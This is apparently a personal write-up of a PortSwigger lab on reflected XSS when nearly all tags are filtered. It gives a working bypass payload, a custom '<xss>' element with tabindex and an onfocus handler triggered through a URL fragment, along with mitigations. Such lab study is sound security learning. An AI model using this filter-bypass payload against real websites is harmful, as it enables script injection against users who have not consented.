# Lab14 - Reflected XSS With All Tags Blocked Except Custom Events

## Objective

Exploit reflected XSS using allowed events despite aggressive filtering.

Execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | HTML Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

Most tags blocked.

Only limited:

```text
Custom Elements
Custom Events
```

remain available.

---

# Analysis

## Step 1

Identify surviving tags.

Found:

```html
<xss>
```

allowed.

---

## Step 2

Identify allowed events.

Found:

```html
onfocus
```

allowed.

---

## Step 3

Need automatic trigger.

Use:

```html
tabindex
```

and URL fragment.

---

# Full Payload(s) Used

```html
<xss id=x tabindex=1 onfocus=alert(document.domain)>
```

Exploit URL:

```text
#x
```

---

# Why The Payload Works

```text
Custom Element Allowed
        ↓
Focusable Element Created
        ↓
Fragment Focuses Element
        ↓
onfocus Fires
        ↓
alert(document.domain)
```

---

# Personal Analysis & Testing Process

## Initial Observation

Standard payloads blocked.

---

## Key Realization

Custom elements survive.

---

## Strategy

Create focusable element.

Use:

```html
tabindex
```

and

```text
#fragment
```

to trigger focus.

---

## Result

```javascript
alert(document.domain)
```

executed.

Lab solved.

---

# Mitigation

Filter custom elements.

Restrict event handler attributes.

---

# Key Learnings

- Fragment identifiers can trigger focus.
- Custom elements create filter bypass opportunities.
- Event handlers remain a common bypass technique.